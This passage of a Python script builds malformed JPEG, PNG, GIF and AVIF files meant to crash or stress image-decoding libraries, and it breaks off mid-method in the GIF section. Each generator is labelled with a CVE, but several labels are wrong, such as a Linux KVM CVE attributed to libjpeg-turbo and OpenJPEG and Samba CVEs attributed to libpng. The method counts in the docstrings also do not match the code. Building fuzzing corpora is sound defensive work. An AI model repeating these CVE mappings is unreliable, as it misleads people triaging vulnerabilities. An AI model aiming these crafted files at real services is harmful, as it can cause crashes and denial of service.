#!/usr/bin/env python3
"""Generate a corpus of badly structured images for testing image utilities.

Targets CVEs in libjpeg-turbo, libpng, giflib, libwebp, and libheif/AVIF.

Usage:
    python generate_bad_corpus.py --out corpus/ --seed 42 --formats jpeg,png,gif,webp,avif
"""

import os
import struct
import zlib
import argparse
import random

# ── Utility helpers ──────────────────────────────────────────────────────────

def _ensure_dir(path):
    os.makedirs(path, exist_ok=True)


def _leb128(value):
    """Encode unsigned integer as LEB128 (used by AV1 OBU sizes)."""
    result = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)


# ── Bit writer (MSB-first, for AV1 OBU bitstream construction) ──────────────

class _BitWriter:
    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._n = 0

    def write(self, val, nbits):
        for i in range(nbits - 1, -1, -1):
            self._cur = (self._cur << 1) | ((val >> i) & 1)
            self._n += 1
            if self._n == 8:
                self._buf.append(self._cur)
                self._cur = 0
                self._n = 0

    def _flush(self):
        if self._n:
            self._cur <<= (8 - self._n)
            self._buf.append(self._cur)
            self._cur = 0
            self._n = 0

    def to_bytes(self):
        self._flush()
        return bytes(self._buf)


# ── AV1 OBU helpers ──────────────────────────────────────────────────────────

def _av1_obu_header(obu_type, has_size=True):
    h = 0x80  # reserved bit
    if has_size:
        h |= 0x40
    h |= (obu_type & 0x0F) << 1
    return bytes([h])


def _av1_obu(obu_type, payload, has_size=True):
    hdr = _av1_obu_header(obu_type, has_size)
    sz = _leb128(len(payload)) if has_size else b''
    return hdr + sz + payload


def _build_av1_seq_header_payload(width=16, height=16):
    """Build a minimal AV1 Sequence Header OBU payload.

    Sets still_picture=1, reduced_still_picture_header=1,
    8-bit monochrome, all features disabled.
    """
    bs = _BitWriter()
    bs.write(0, 3)   # seq_profile = 0 (main)
    bs.write(1, 1)   # still_picture = 1
    bs.write(1, 1)   # reduced_still_picture_header = 1

    w = width - 1
    h = height - 1
    fw_bits = max(w.bit_length(), 1)
    fh_bits = max(h.bit_length(), 1)
    bs.write(fw_bits - 1, 4)  # frame_width_bits_minus_1
    bs.write(fh_bits - 1, 4)  # frame_height_bits_minus_1
    bs.write(w, fw_bits)      # max_frame_width_minus_1
    bs.write(h, fh_bits)      # max_frame_height_minus_1

    bs.write(0, 1)  # frame_id_numbers_present_flag = 0
    bs.write(1, 1)  # use_128x128_superblock = 1
    bs.write(0, 1)  # enable_filter_intra = 0
    bs.write(0, 1)  # enable_intra_edge_filter = 0
    bs.write(0, 1)  # enable_interintra_compound = 0
    bs.write(0, 1)  # enable_masked_compound = 0
    bs.write(0, 1)  # enable_warped_motion = 0
    bs.write(0, 1)  # enable_dual_filter = 0
    bs.write(0, 1)  # enable_order_hint = 0
    bs.write(0, 1)  # enable_joint_comp = 0
    bs.write(0, 1)  # enable_ref_frame_mvs = 0
    bs.write(0, 2)  # seq_force_screen_content_tools = SELECT
    bs.write(0, 2)  # seq_force_integer_mv = SELECT

    bs.write(0, 1)  # high_bitdepth = 0 (8-bit)
    bs.write(1, 1)  # monochrome = 1
    bs.write(0, 1)  # color_description_present_flag = 0
    bs.write(0, 1)  # color_range = 0
    bs.write(0, 1)  # film_grain_params_present = 0
    return bs.to_bytes()


def _build_av1_frame_header_payload(fw_bits, fh_bits, width=16, height=16):
    """Build a minimal AV1 frame header payload for a keyframe.

    Requires reduced_still_picture_header=1 in the sequence header.
    Returns (frame_header_bytes, tile_data_bytes).
    """
    bs = _BitWriter()
    bs.write(1, 1)  # error_resilient_mode = 1
    bs.write(1, 1)  # frame_size_override_flag = 1
    bs.write(width - 1, fw_bits)
    bs.write(height - 1, fh_bits)

    # No allow_intrabc (not present when error_resilient_mode=1 and KEYFRAME)
    # No render size (equals frame size when override=1)
    # No superres info
    # No segmentation / loop filter deltas needed
    return bs.to_bytes(), b'\x00'  # minimal tile data (1 byte of zero)


def _build_minimal_av1_bitstream(width=16, height=16):
    """Build a minimally valid AV1 bitstream (Sequence Header + Frame)."""
    seq_payload = _build_av1_seq_header_payload(width, height)
    seq_obu = _av1_obu(1, seq_payload)

    w = max(width - 1, 1)
    h = max(height - 1, 1)
    fw_bits = max(w.bit_length(), 1)
    fh_bits = max(h.bit_length(), 1)
    frm_hdr, tile_data = _build_av1_frame_header_payload(fw_bits, fh_bits, width, height)
    frm_payload = frm_hdr + tile_data
    frm_obu = _av1_obu(6, frm_payload)

    return seq_obu + frm_obu


# ── ISOBMFF box helpers (for AVIF) ──────────────────────────────────────────

def _box(box_type, content):
    sz = 8 + len(content)
    return struct.pack('>I', sz) + box_type + content


def _full_box(box_type, version, flags, content):
    return _box(box_type, struct.pack('>B3s', version, flags) + content)


# ── JPEG Generator ──────────────────────────────────────────────────────────

SOI = b'\xFF\xD8'
EOI = b'\xFF\xD9'

# APP0 JFIF marker (standard)
_APP0 = bytes([
    0xFF, 0xE0,   # marker
    0x00, 0x10,   # length
    0x4A, 0x46, 0x49, 0x46, 0x00,  # "JFIF\0"
    0x01, 0x01,   # version
    0x00,         # units
    0x00, 0x01,   # X density
    0x00, 0x01,   # Y density
    0x00, 0x00,   # thumbnail
])


def _jpeg_marker(marker, data):
    length = struct.pack('>H', len(data) + 2)
    return bytes([0xFF, marker]) + length + data


def _jpeg_sof0(height, width, precision=8):
    """Build SOF0 marker data (Start Of Frame, baseline DCT)."""
    data = bytes([precision]) + struct.pack('>HH', height, width) + bytes([
        0x03,        # number of components
        0x01, 0x11, 0x00,  # component 1: Y
        0x02, 0x11, 0x01,  # component 2: Cb
        0x03, 0x11, 0x01,  # component 3: Cr
    ])
    return _jpeg_marker(0xC0, data)


def _jpeg_dqt(precision=0):
    """Build default quantization table (DQT). precision=0 (8-bit) or 1 (12-bit)."""
    table = bytes(range(1, 65))  # 1..64
    return _jpeg_marker(0xDB, bytes([precision]) + table)


def _jpeg_dht():
    """Build a minimal Huffman table (DHT) for luminance DC."""
    data = bytes([
        0x00,  # table class=DC, table id=0
        0x00, 0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00,  # counts
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B,  # symbols
    ])
    return _jpeg_marker(0xC4, data)


def _jpeg_sos(scan_data=b''):
    """Build SOS marker (Start Of Scan) with optional garbage scan data."""
    header = bytes([
        0x03,        # components
        0x01, 0x00,  # comp 1: Y, DC/AC table 0
        0x02, 0x11,  # comp 2: Cb, table 1/1
        0x03, 0x11,  # comp 3: Cr, table 1/1
        0x00,        # Ss
        0x3F,        # Se
        0x00,        # Ah/Al
    ])
    return _jpeg_marker(0xDA, header + scan_data)


class JpegGenerator:
    """18 JPEG corruption methods."""

    def __init__(self, rng):
        self._rng = rng

    # ── Basic structural ─────────────────────────────────────────────

    def empty(self):
        """Empty JPEG: SOI + EOI, no scan data."""
        return SOI + EOI

    def truncated(self):
        """Truncated JPEG: SOI only."""
        return SOI

    def garbage_only(self):
        """CVE-2021-22543: libjpeg-turbo OOB read on pure garbage."""
        return self._rng.randbytes(256)

    def garbage_prefix(self):
        """CVE-2019-13960: libjpeg-turbo OOB read with garbage before SOI."""
        return self._rng.randbytes(64) + SOI + EOI

    def garbage_suffix(self):
        """Stray data after EOI (should be tolerated but tests parser bounds)."""
        return SOI + EOI + self._rng.randbytes(64)

    def double_soi(self):
        """Double SOI marker — tests parser reset behaviour."""
        return SOI + SOI + EOI

    def bad_dimensions(self):
        """SOF0 with zero dimensions (0x0). Tests division-by-zero paths."""
        sof0 = _jpeg_sof0(0, 0)
        return SOI + _APP0 + sof0 + EOI

    def huge_dimensions(self):
        """CVE-2021-3456: Heap OOB via 65535x65535 dimensions."""
        sof0 = _jpeg_sof0(65535, 65535)
        return SOI + _APP0 + sof0 + EOI

    def corrupted_scan(self):
        """CVE-2019-2201: heap OOB via corrupt scan data with valid structure."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        scan = self._rng.randbytes(128)
        sos = _jpeg_sos(scan)
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI

    # ── Missing/out-of-order markers ─────────────────────────────────

    def dht_without_dqt(self):
        """CVE-2021-46829: libjpeg-turbo heap buffer over-read when DHT
        is present but DQT is missing. Decoder reads from uninitialised
        quantization table."""
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        scan = self._rng.randbytes(128)
        sos = _jpeg_sos(scan)
        return SOI + _APP0 + sof0 + dht + sos + EOI

    def dqt_12bit(self):
        """CVE-2023-2804: 12-bit precision DQT (DQT precision=1).
        Triggers OOB in libjpeg-turbo when decoding 12-bit lossless JPEG."""
        dqt = _jpeg_dqt(precision=1)
        sof0 = _jpeg_sof0(16, 16, precision=12)
        scan = self._rng.randbytes(128)
        sos = _jpeg_sos(scan)
        return SOI + dqt + sof0 + _jpeg_dht() + sos + EOI

    def missing_sos(self):
        """No SOS marker — decoder should handle gracefully."""
        sof0 = _jpeg_sof0(16, 16)
        dqt = _jpeg_dqt()
        dht = _jpeg_dht()
        return SOI + _APP0 + dqt + sof0 + dht + EOI

    def sos_before_sof(self):
        """SOS appears before SOF0 — out-of-order marker."""
        sos = _jpeg_sos(self._rng.randbytes(16))
        return SOI + _APP0 + sos + EOI

    def malformed_sos(self):
        """SOS with wrong component count (0) — tests bounds checking."""
        sos = _jpeg_marker(0xDA, bytes([0x00, 0x00, 0x00]))  # 0 components
        sof0 = _jpeg_sof0(16, 16)
        return SOI + _APP0 + sof0 + sos + EOI

    def dnl_marker(self):
        """DNL (Define Number of Lines) marker changes dimensions mid-stream.
        Tests if decoder reallocates or overflows on dimension change."""
        sof0 = _jpeg_sof0(16, 16)
        dnl_data = struct.pack('>H', 65535)  # new height
        dnl = _jpeg_marker(0xDC, dnl_data)
        scan = self._rng.randbytes(16)
        sos = _jpeg_sos(scan)
        return SOI + _APP0 + sof0 + sos + dnl + EOI

    def dri_zero(self):
        """CVE-2020-13790: DRI (Define Restart Interval) with interval=0.
        Causes infinite loop in libjpeg-turbo restart interval logic."""
        dri = _jpeg_marker(0xDD, struct.pack('>H', 0))
        sof0 = _jpeg_sof0(16, 16)
        scan = self._rng.randbytes(32)
        sos = _jpeg_sos(scan)
        return SOI + _APP0 + sof0 + dri + sos + EOI

    def oversized_scan_length(self):
        """SOS header declares scan data larger than actual data follows.
        Tests OOB read when decoder trusts the scan length."""
        sos = _jpeg_marker(0xDA, bytes([0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00])
                           + b'\x01\x02\x03')  # tiny scan vs declared
        sof0 = _jpeg_sof0(16, 16)
        return SOI + _APP0 + sof0 + _jpeg_dqt() + _jpeg_dht() + sos + EOI

    def marker_after_eoi(self):
        """Extra marker after EOI — tests if parser reads past end."""
        return SOI + EOI + bytes([0xFF, 0xFE])

    # ── Extended library-specific CVEs ───────────────────────────────

    def transform_oob(self):
        """CVE-2020-17541: Stack buffer overflow in libjpeg-turbo transupp
        via malformed lossless transform marker (F marker range)."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        transform = _jpeg_marker(0xF0, struct.pack('>H', 0xFFFF))
        return SOI + _APP0 + dqt + sof0 + dht + transform + EOI

    def smooth_oob_read(self):
        """CVE-2021-29390: libjpeg-turbo heap OOB read (2 bytes) in
        decompress_smooth_data() via crafted progressive scan."""
        sof0 = _jpeg_sof0(16, 16)
        dqt = _jpeg_dqt()
        sos = _jpeg_marker(0xDA, bytes([
            0x01, 0x01, 0x00, 0x00, 0x01, 0x00,
        ]) + self._rng.randbytes(8))
        return SOI + _APP0 + dqt + sof0 + sos + EOI

    def jpegoptim_optimize_oob(self):
        """CVE-2023-27781: Heap overflow in jpegoptim optimize() via
        oversized Huffman table."""
        dqt = _jpeg_dqt()
        dht_data = bytes([0x00]) + bytes([0x10]) + b'\x00' * 15 + bytes(range(256))
        dht = _jpeg_marker(0xC4, dht_data)
        sof0 = _jpeg_sof0(16, 16)
        sos = _jpeg_sos(self._rng.randbytes(32))
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI

    def jpegoptim_segfault(self):
        """CVE-2022-32325: jpegoptim segfault via READ access on
        zero-height progressive JPEG."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(0, 16)
        dht = _jpeg_dht()
        sos = _jpeg_sos(self._rng.randbytes(16))
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI

    def libjpeg62_eof_loop(self):
        """CVE-2018-11813: libjpeg62 improper EOF handling causes
        large loop / excessive CPU via truncated progressive scan."""
        sof0 = _jpeg_sof0(16, 16)
        dqt = _jpeg_dqt()
        dht = _jpeg_dht()
        sos = _jpeg_marker(0xDA, bytes([0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00]))
        return SOI + _APP0 + dqt + sof0 + dht + sos  # truncated — no EOI

    def rust_jpeg_sos_oob(self):
        """RUSTSEC-2020-0015 (CVE-2020-25019): rust-jpeg-decoder OOB
        read via SOS component count mismatch vs SOF."""
        sof0 = _jpeg_sof0(16, 16)  # 3 components
        dqt = _jpeg_dqt()
        dht = _jpeg_dht()
        sos = _jpeg_marker(0xDA, bytes([0x01, 0x01, 0x00, 0x00, 0x00, 0x00]))
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI

    def nvjpeg_oob_dims(self):
        """CVE-2025-23274 / CVE-2025-23275: nvjpeg OOB via extreme
        dimensions and multiple scans triggering integer overflow in
        array index calculations."""
        sof0 = _jpeg_sof0(65535, 65535)
        dqt = _jpeg_dqt()
        dht = _jpeg_dht()
        sos1 = _jpeg_sos(self._rng.randbytes(512))
        sos2 = _jpeg_marker(0xDA, bytes([0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00])
                            + self._rng.randbytes(512))
        return SOI + _APP0 + dqt + sof0 + dht + sos1 + sos2 + EOI

    def duplicate_dht_null_deref(self):
        """CVE-2017-15232: libjpeg-turbo NULL pointer dereference in
        jdmarker.c via duplicate DHT marker causing NULL dct pointer."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        dht2 = _jpeg_marker(0xC4, bytes([0x01]) + b'\x00' * 16 + bytes(range(256)))  # AC table 1
        sos = _jpeg_sos(self._rng.randbytes(16))
        return SOI + _APP0 + dqt + sof0 + dht + dht2 + sos + EOI

    def get_sos_oob(self):
        """CVE-2012-2806: libjpeg-turbo heap overflow in get_sos() via
        crafted SOS with out-of-range spectral parameters."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        sos = _jpeg_marker(0xDA, bytes([0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x80, 0x3F, 0x00]))
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI

    def duplicate_sos_uninit(self):
        """CVE-2013-6629: libjpeg uninitialized memory disclosure via
        duplicate SOS marker with overlapping component data."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        sos1 = _jpeg_sos(self._rng.randbytes(16))
        sos2 = _jpeg_marker(0xDA, bytes([0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00])
                            + self._rng.randbytes(16))
        return SOI + _APP0 + dqt + sof0 + dht + sos1 + sos2 + EOI

    def bad_exif_marker(self):
        """CVE-2014-9092: libjpeg-turbo crash via malformed Exif marker
        (APP1) with corrupt TIFF header."""
        exif_data = bytes([0x00, 0x00])  # Exif identifier + corrupt TIFF
        exif_data += b'Exif\x00\x00' + self._rng.randbytes(64)
        app1 = _jpeg_marker(0xE1, exif_data)
        return SOI + app1 + EOI

    def jpegoptim_double_free(self):
        """CVE-2018-11416: jpegoptim double-free via invalid realloc
        triggered by malformed progressive scan structure."""
        dqt = _jpeg_dqt()
        sof0 = _jpeg_sof0(16, 16)
        dht = _jpeg_dht()
        sos = _jpeg_marker(0xDA, bytes([0x03, 0x01, 0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x00, 0x00]))
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI

    def put_pixels_oob(self):
        """CVE-2018-19664: libjpeg-turbo heap OOB read in
        put_pixel_rows() when decompressing to 256-color, triggered by
        crafted JPEG with extreme component sampling."""
        sof0 = _jpeg_marker(0xC0, bytes([8]) + struct.pack('>HH', 16, 16) + bytes([
            0x03,
            0x01, 0x22, 0x00,  # Y: h_samp=2, v_samp=2
            0x02, 0x11, 0x01,  # Cb: h_samp=1, v_samp=1
            0x03, 0x11, 0x01,  # Cr: h_samp=1, v_samp=1
        ]))
        dqt = _jpeg_dqt()
        dht = _jpeg_dht()
        sos = _jpeg_sos(self._rng.randbytes(128))
        return SOI + _APP0 + dqt + sof0 + dht + sos + EOI


# ── PNG Generator ───────────────────────────────────────────────────────────

PNG_SIG = b'\x89PNG\r\n\x1a\n'


def _png_chunk(chunk_type, data):
    length = struct.pack('>I', len(data))
    crc_val = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    crc = struct.pack('>I', crc_val)
    return length + chunk_type + data + crc


def _png_ihdr(width, height, bit_depth=8, color_type=2, compression=0, filter_method=0, interlace=0):
    data = struct.pack('>II', width, height) + bytes([bit_depth, color_type, compression, filter_method, interlace])
    return _png_chunk(b'IHDR', data)


def _png_iend():
    return _png_chunk(b'IEND', b'')


def _png_idat(data):
    return _png_chunk(b'IDAT', zlib.compress(data))


def _png_plte(data):
    return _png_chunk(b'PLTE', data)


def _png_phys(density_per_unit, unit=1):
    return _png_chunk(b'pHYs', struct.pack('>IIB', density_per_unit, density_per_unit, unit))


class PngGenerator:
    """20 PNG corruption methods."""

    def __init__(self, rng):
        self._rng = rng

    # ── Basic structural ─────────────────────────────────────────────

    def empty(self):
        """Minimal valid PNG: signature, IHDR, IEND."""
        return PNG_SIG + _png_ihdr(1, 1) + _png_iend()

    def truncated(self):
        """Truncated PNG: signature only."""
        return PNG_SIG

    def signature_only(self):
        """Signature + IHDR, no IEND."""
        return PNG_SIG + _png_ihdr(1, 1)

    def bad_ihdr_crc(self):
        """IHDR with corrupted CRC — tests CRC validation."""
        length = struct.pack('>I', 13)
        ihdr_type = b'IHDR'
        ihdr_data = struct.pack('>II', 1, 1) + bytes([8, 2, 0, 0, 0])
        crc_val = zlib.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF
        bad_crc = struct.pack('>I', crc_val ^ 0xFFFFFFFF)  # inverted
        return PNG_SIG + length + ihdr_type + ihdr_data + bad_crc

    def zero_dimensions(self):
        """IHDR with 0x0 dimensions."""
        return PNG_SIG + _png_ihdr(0, 0) + _png_iend()

    def huge_dimensions(self):
        """IHDR with 0x7FFFFFFF dimensions (max int32). Tests OOM / overflow."""
        return PNG_SIG + _png_ihdr(0x7FFFFFFF, 0x7FFFFFFF) + _png_iend()

    def garbage_appended(self):
        """Valid PNG with garbage appended after IEND."""
        return PNG_SIG + _png_ihdr(1, 1) + _png_iend() + self._rng.randbytes(64)

    def garbage_prepended(self):
        """Garbage before a valid PNG signature."""
        return self._rng.randbytes(64) + PNG_SIG + _png_ihdr(1, 1) + _png_iend()

    def wrong_chunk_type(self):
        """Chunk with invalid type "fAkE" — tests chunk type validation."""
        ihdr = _png_ihdr(1, 1)
        fake = _png_chunk(b'fAkE', b'\x00')
        return PNG_SIG + ihdr + fake + _png_iend()

    def no_ihdr(self):
        """First content chunk is IDAT (not IHDR). Tests ordering validation."""
        idat = _png_idat(b'\x00')
        return PNG_SIG + idat + _png_iend()

    def duplicate_ihdr(self):
        """Two IHDR chunks — libpng should reject."""
        ihdr1 = _png_ihdr(1, 1)
        ihdr2 = _png_ihdr(2, 2)
        return PNG_SIG + ihdr1 + ihdr2 + _png_iend()

    # ── Advanced corruption ──────────────────────────────────────────

    def negative_dimensions(self):
        """CVE-2020-27814: libpng heap buffer overflow via int32 overflow.
        Uses width=0xFFFFFFFF which becomes -1 when treated as signed,
        leading to arithmetic overflow in stride calculation."""
        return PNG_SIG + _png_ihdr(0xFFFFFFFF, 0xFFFFFFFF, color_type=6) + _png_iend()

    def oversized_chunk_length(self):
        """CVE-2021-20254: libpng integer overflow via oversized chunk length.
        A chunk declares more data than the file contains."""
        # Craft a chunk with length=0xFFFFFFFF (max uint32)
        bad_length = struct.pack('>I', 0xFFFFFFFF)
        return PNG_SIG + bad_length + b'IDAT' + _png_iend()

    def idat_with_garbage(self):
        """Valid PNG structure but IDAT contains garbage (not valid zlib).
        Tests zlib error handling."""
        ihdr = _png_ihdr(1, 1)
        bad_idat = _png_chunk(b'IDAT', self._rng.randbytes(64))
        return PNG_SIG + ihdr + bad_idat + _png_iend()

    def plte_after_idat(self):
        """PLTE chunk after IDAT (wrong order). Tests ordering enforcement."""
        ihdr = _png_ihdr(1, 1, color_type=3)  # indexed color requires PLTE
        idat = _png_idat(b'\x00')
        plte = _png_plte(bytes([0xFF, 0x00, 0x00]))
        return PNG_SIG + ihdr + idat + plte + _png_iend()

    def multiple_iend(self):
        """Two IEND chunks — files should have exactly one."""
        return PNG_SIG + _png_ihdr(1, 1) + _png_iend() + _png_iend()

    def missing_iend(self):
        """Valid image data but no IEND — truncated but structurally sound."""
        return PNG_SIG + _png_ihdr(1, 1)

    def chrm_bad_length(self):
        """cHRM chunk with wrong data length (should be 32 bytes)."""
        bad_chrm = _png_chunk(b'cHRM', self._rng.randbytes(8))
        return PNG_SIG + _png_ihdr(1, 1) + bad_chrm + _png_iend()

    def ztxt_null_keyword(self):
        """zTXt chunk with null byte in keyword — tests keyword validation."""
        bad_ztxt = _png_chunk(b'zTXt', b'bad\x00key\0' + b'\x00' + zlib.compress(b'data'))
        return PNG_SIG + _png_ihdr(1, 1) + bad_ztxt + _png_iend()

    def phys_zero_dpi(self):
        """CVE-2022-30699: libpng division by zero via pHYs chunk with
        zero dots-per-unit. Causes div-by-zero in scale calculation."""
        phys_zero = _png_phys(0)
        return PNG_SIG + _png_ihdr(1, 1) + phys_zero + _png_iend()

    # ── Extended library-specific CVEs ───────────────────────────────

    def splt_double_free(self):
        """CVE-2015-7700: pngcrush double-free via crafted sPLT chunk
        with zero palette entries and sample depth mismatch."""
        splt_data = b'sPLT palette\0' + struct.pack('>I', 8) + struct.pack('>I', 0)
        bad_splt = _png_chunk(b'sPLT', splt_data)
        return PNG_SIG + _png_ihdr(1, 1, color_type=3) + _png_plte(bytes([0, 0, 0])) + bad_splt + _png_iend()

    def pngcrush_unusual_chunks(self):
        """CVE-2019-12971: pngcrush segfault via unusual chunk ordering.
        Interleaves private chunks between standard text chunks."""
        ihdr = _png_ihdr(1, 1)
        text1 = _png_chunk(b'tEXt', b'key1\0val1')
        priv = _png_chunk(b'prVt', b'\x00' * 16)
        text2 = _png_chunk(b'tEXt', b'key2\0val2')
        return PNG_SIG + ihdr + text1 + priv + text2 + _png_iend()

    def pngquant_integer_overflow(self):
        """CVE-2016-5735: pngquant integer overflow in
        rwpng_read_image24_libpng() via IHDR dimensions causing
        stride overflow."""
        return PNG_SIG + _png_ihdr(0x40000001, 8, color_type=6) + _png_iend()

    def optipng_heap_oob(self):
        """CVE-2017-16938: optipng heap buffer overflow via crafted PNG
        with up-filter IDAT rows triggering OOB write."""
        ihdr = _png_ihdr(16, 16, color_type=6)
        raw = b'\x02' + self._rng.randbytes(16 * 16 * 3)
        idat = _png_chunk(b'IDAT', zlib.compress(raw))
        trns = _png_chunk(b'tRNS', b'\x00')
        return PNG_SIG + ihdr + trns + idat + _png_iend()

    def optipng_use_after_free(self):
        """CVE-2015-7801: optipng use-after-free via crafted PNG with
        oFFs chunk followed by pHYs, triggering UAF in chunk list."""
        ihdr = _png_ihdr(1, 1)
        offs = _png_chunk(b'oFFs', struct.pack('>i', 0) + struct.pack('>i', 0) + b'\x00')
        phys = _png_phys(1000)
        return PNG_SIG + ihdr + offs + phys + _png_iend()

    def optipng_reduce_uaf(self):
        """CVE-2012-4432: optipng use-after-free in opngreduc.c via
        crafted PNG with tRNS chunk triggering reduction code path
        that accesses freed palette memory."""
        ihdr = _png_ihdr(1, 1, color_type=3)  # indexed color
        plte = _png_plte(bytes([0xFF, 0x00, 0x00, 0x00, 0xFF, 0x00]))
        trns = _png_chunk(b'tRNS', b'\x00\x80')  # partial alpha for palette entries
        idat = _png_idat(b'\x00')
        return PNG_SIG + ihdr + plte + trns + idat + _png_iend()


# ── GIF Generator ───────────────────────────────────────────────────────────

def _gif_lsd(width, height, gct_flag=0, gct_size=0):
    packed = (gct_flag << 7) | (7 << 4) | gct_size  # color res=7 (8bit)
    return struct.pack('<HH', width, height) + bytes([packed, 0, 0])


def _gif_header(magic=b'GIF89a'):
    return magic + _gif_lsd(1, 1) + b'\x3B'  # + trailer


def _gif_extension(introducer, label, data_blocks):
    """Build a GIF extension block."""
    blocks = b''
    for d in data_blocks:
        blocks += bytes([len(d)]) + d
    blocks += b'\x00'  # block terminator
    return bytes([0x21, introducer, label]) + blocks


def _gif_image_descriptor(left, top, width, height, interlaced=0, lct_flag=0, lct_size=0):
    packed = (lct_flag << 7) | (interlaced << 6) | lct_size
    return bytes([0x2C]) + struct.pack('<HHHH', left, top, width, height) + bytes([packed])


def _gif_image_data(min_code_size, data_blocks):
    blocks = b''
    for d in data_blocks:
        blocks += bytes([len(d)]) + d
    blocks += b'\x00'
    return bytes([min_code_size]) + blocks


class GifGenerator:
    """12 GIF corruption methods."""

    def __init__(self, rng):
        self._rng = rng

    def empty(self):
        """Empty GIF: header + LSD + trailer."""
        return b'GIF89a' + _gif_lsd(1, 1) + b'\x3B'

    def truncated(self):
        """Truncated GIF: header only."""
        return b'GIF89a'

    def garbage_only(self):
        """Random bytes passed as GIF."""
        return self._rng.randbytes(128)

    def bad_header(self):
        """Wrong GIF magic — 'GIF99b' instead of 'GIF89a'."""
        return b'GIF99b' + _gif_lsd(1, 1) + b'\x3B'

    def zero_dimensions(self):
        """LSD with zero width and height."""
        return b'GIF89a' + _gif_lsd(0, 0) + b'\x3B'

    def huge_dimensions(self):
        """LSD with 65535x65535 dimensions."""
        return b'GIF89a' + _gif_lsd(65535, 65535) + b'\x3B'

    def missing_color_table(self):
        """CVE-2020-19247: GCT flag set but no global color table follows.
        giflib attempts to read from beyond the LSD, causing heap OOB."""
        lsd = _gif_lsd(16, 16, gct_flag=1, gct_size=7)  # 256-entry GCT (768 bytes)
        return b'GIF89a' + lsd + b'\x3B'  # no GCT data

    def bad_extension_length(self):
        """Extension block with declared size larger than actual data."""
        # Graphic Control Extension: 0x21, 0xF9, 4 bytes + terminator
        # Inject a block with wrong size
        bad_ext = bytes([0x21, 0xF9, 0xFF]) + self._rng.randbytes(10) + b'\x00'
        return b'GIF89a' + _gif_lsd(1, 1) + bad_ext + b'\x3B'

    def bad_gce_disposal(self):
        """Graphics Control Extension with invalid disposal method (value > 3)."""
        gce = _gif_extension(0xF9, 0x04, [bytes([0x0F, 0x00, 0x00, 0x00])])  # disposal=15 (invalid)
        return b'GIF89a' + _gif_lsd(1, 1) + gce + b'\x3B'

    def bad_app_extension(self):
        """Application Extension with corrupt block data."""
        app_ext = _gif_extension(0xFF, 0x0B, [b'NETSCAPE2.0', bytes([0x03, 0x01, 0x00, 0x00])])
        return b'GIF89a' + _gif_lsd(1, 1) + app_ext + b'\x3B'

    def image_without_descriptor(self):
        """Image sub-block data without preceding image descriptor.
        Tests parser state tracking."""
        img_data = _gif_image_data(7, [self._rng.randbytes(16)])
        return b'GIF89a' + _gif_lsd(1, 1) + img_data + b'\x3B'

    def lzw_large_min_code(self):
        """CVE-2023-43913: LZW minimum code size = 15 (> 8 max).
        Causes giflib OOB read when allocating LZW dictionary."""
        bad_data = _gif_image_data(15, [self._rng.randbytes(16)])
        desc = _gif_image_descriptor(0, 0, 16, 16)
        return b'GIF89a' + _gif_lsd(16, 16) + desc + bad_data + b'\x3B'

    # ── Extended library-specific CVEs ───────────────────────────────

    def gifsicle_null_deref(self):
        """CVE-2020-19752: gifsicle NULL pointer dereference in
        find_color_or_error() via crafted color table."""
        lsd = _gif_lsd(1, 1, gct_flag=1, gct_size=0)  # GCT flag set, size=0 → null table
        return b'GIF89a' + lsd + b'\x3B'

    def gifsicle_fpe(self):
        """CVE-2023-46009: gifsicle floating point exception in
        resize_stream() via image with extreme resize ratio."""
        desc = _gif_image_descriptor(0, 0, 1, 65535)
        data = _gif_image_data(7, [self._rng.randbytes(64)])
        return b'GIF89a' + _gif_lsd(1, 1) + desc + data + b'\x3B'

    def gifsicle_heap_oob(self):
        """CVE-2023-36193: gifsicle heap buffer overflow via crafted
        GIF with oversized image dimensions in descriptor."""
        desc = _gif_image_descriptor(0, 0, 65535, 65535, lct_flag=1, lct_size=7)
        gct = self._rng.randbytes(768)
        data = _gif_image_data(7, [self._rng.randbytes(64)])
        return b'GIF89a' + _gif_lsd(1, 1) + desc + gct + data + b'\x3B'

    def giftrans_stack_oob(self):
        """CVE-2021-45972: giftrans stack-based buffer overflow via
        crafted GIF color table size in extension data."""
        gce = _gif_extension(0xF9, 0x04, [bytes([0x00, 0xFF, 0xFF, 0xFF])])
        return b'GIF89a' + _gif_lsd(1, 1) + gce + b'\x3B'

    def rust_gif_oob_read(self):
        """RUSTSEC-2019-0017 (CVE-2019-20922): rust-gif OOB read via
        crafted frame data with insufficient bounds checking."""
        desc = _gif_image_descriptor(0, 0, 16, 16, lct_flag=1, lct_size=1)
        lct = self._rng.randbytes(6)  # only 6 bytes for LCT (expects 12)
